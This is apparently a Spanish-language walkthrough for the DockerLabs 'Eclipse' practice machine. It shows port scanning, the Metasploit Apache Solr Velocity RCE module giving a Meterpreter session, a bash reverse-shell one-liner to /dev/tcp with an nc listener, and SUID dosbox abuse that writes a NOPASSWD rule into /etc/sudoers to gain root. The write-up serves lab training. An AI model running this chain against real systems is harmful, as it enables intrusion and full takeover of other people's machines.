# Eclipse DockerLabs (intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip eclipse.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh eclipse.tar
```

Info:

```
stamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-10 12:25 EST
Nmap scan report for express.dl (172.17.0.2)
Host is up (0.000024s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Epic Battle
8983/tcp open  http    Apache Solr
| http-title: Solr Admin
|_Requested resource was http://express.dl:8983/solr/
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.53 seconds
```

Si vamos al puerto `8983` vemos que nos carga un software llamado `Solr` por lo que vamos a buscar si contiene alguna vulnerabilidad dicho software.

Antes vamos a ver en que version esta.

```shell
http://172.17.0.2:8983 [302 Found] Country[RESERVED][ZZ], IP[172.17.0.2], RedirectLocation[http://172.17.0.2:8983/solr/]
http://172.17.0.2:8983/solr/ [200 OK] Country[RESERVED][ZZ], IP[172.17.0.2], JQuery[2.1.3], Script, Title[Solr Admin], X-Frame-Options[DENY], X-UA-Compatible[IE=9]
```

No nos da mucha informacion, pero vamos a ver en `metasploit` que vemos.

## Escalate user ninhack

### Metasploit

```shell
msfconsole -q
```

Si buscamos por el software:

```shell
search solr
```

Info:

```
Matching Modules
================

   #   Name                                            Disclosure Date  Rank       Check  Description
   -   ----                                            ---------------  ----       -----  -----------
   0   exploit/linux/http/apache_solr_backup_restore   2024-02-24       excellent  Yes    Apache Solr Backup/Restore APIs RCE
   1   exploit/multi/http/solr_velocity_rce            2019-10-29       excellent  Yes    Apache Solr Remote Code Execution via Velocity Template
   2     \_ target: Java (in-memory)                   .                .          .      .
   3     \_ target: Unix (in-memory)                   .                .          .      .
   4     \_ target: Linux (dropper)                    .                .          .      .
   5     \_ target: x86/x64 Windows PowerShell         .                .          .      .
   6     \_ target: x86/x64 Windows CmdStager          .                .          .      .
   7     \_ target: Windows Exec                       .                .          .      .
   8   auxiliary/scanner/http/log4shell_scanner        2021-12-09       normal     No     Log4Shell HTTP Scanner
   9     \_ AKA: Log4Shell                             .                .          .      .
   10    \_ AKA: LogJam                                .                .          .      .
   11  exploit/linux/http/trendmicro_websecurity_exec  2020-06-10       excellent  Yes    Trend Micro Web Security (Virtual Appliance) Remote Code Execution


Interact with a module by name or index. For example info 11, use 11 or use exploit/linux/http/trendmicro_websecurity_exec
```

Vemos que el que mas nos interesa es el numero `1` que seria `multi/http/solr_velocity_rce` y lo configuramos de la siguiente forma:

```shell
set LPORT <PORT>
set LHOST <IP_HOST>
set RHOSTS <IP_VICTIM>
exploit
```

Info:

```
[*] Started reverse TCP handler on 192.168.120.128:7777 
[*] 172.17.0.2:8983: Authentication not required
[*] Found Apache Solr 8.3.0
[*] OS version is Linux amd64 6.8.11-amd64
[*] Found core(s): 0xDojo
[+] Found Velocity Response Writer in use by core '0xDojo'
[!] params.resource.loader.enabled for core '0xDojo' is set to false.
[*] Targeting core '0xDojo'
[*] params.resource.loader.enabled is false for '0xDojo', trying to update it...
[+] params.resource.loader.enabled is true for core '0xDojo'
[*] Using URL: http://192.168.120.128:8080/WI2zfuBr7/
[*] Sending stage (57971 bytes) to 172.17.0.2
[*] Meterpreter session 1 opened (192.168.120.128:7777 -> 172.17.0.2:58324) at 2025-01-10 12:35:15 -0500
[*] Server stopped.

meterpreter > getuid
Server username: ninhack
```

## Escalate Privileges

Y vemos que funciona, por lo que haremos lo siguiente, vamos a ver si tiene permisos `SUID` importantes para dicho usuario.

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
2107068     52 -rwsr-xr--   1 root     messagebus    51272 Sep 16  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  2097398     52 -rwsr-xr-x   1 root     root          52880 Mar 23  2023 /usr/bin/chsh
  2097522     48 -rwsr-xr-x   1 root     root          48896 Mar 23  2023 /usr/bin/newgrp
  2097533     68 -rwsr-xr-x   1 root     root          68248 Mar 23  2023 /usr/bin/passwd
  2097585     72 -rwsr-xr-x   1 root     root          72000 Mar 28  2024 /usr/bin/su
  2097459     88 -rwsr-xr-x   1 root     root          88496 Mar 23  2023 /usr/bin/gpasswd
  2097517     60 -rwsr-xr-x   1 root     root          59704 Mar 28  2024 /usr/bin/mount
  2097609     36 -rwsr-xr-x   1 root     root          35128 Mar 28  2024 /usr/bin/umount
  2097392     64 -rwsr-xr-x   1 root     root          62672 Mar 23  2023 /usr/bin/chfn
  2106566   2504 -rwsr-xr-x   1 root     root        2560896 Sep 19  2022 /usr/bin/dosbox
  2106676    276 -rwsr-xr-x   1 root     root         281624 Jun 27  2023 /usr/bin/sudo
```

Vemos un binario interesante que es el siguiente:

Como estamos en `meterpreter` no nos va a dejar abrir el `nano` por lo que haremos lo siguiente:

```shell
shell
bash -c "sh -i >& /dev/tcp/<IP>/<IP> 0>&1"
```

Estaremos a la escucha:

```shell
nc -lvnp <PORT>
```

Y si lo ejecutamos y nos vamos a la escucha obtendremos una shell, por lo que la sanitizaremos.

Sanitizacion de la shell (TTY):

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Y ahora haremos lo siguiente:

```shell
LFILE='/etc/sudoers'
dosbox -c 'mount c /' -c "echo ninhack ALL=(ALL:ALL) NOPASSWD: ALL >c:$LFILE" -c exit
```

Y con esto seremos `root`.
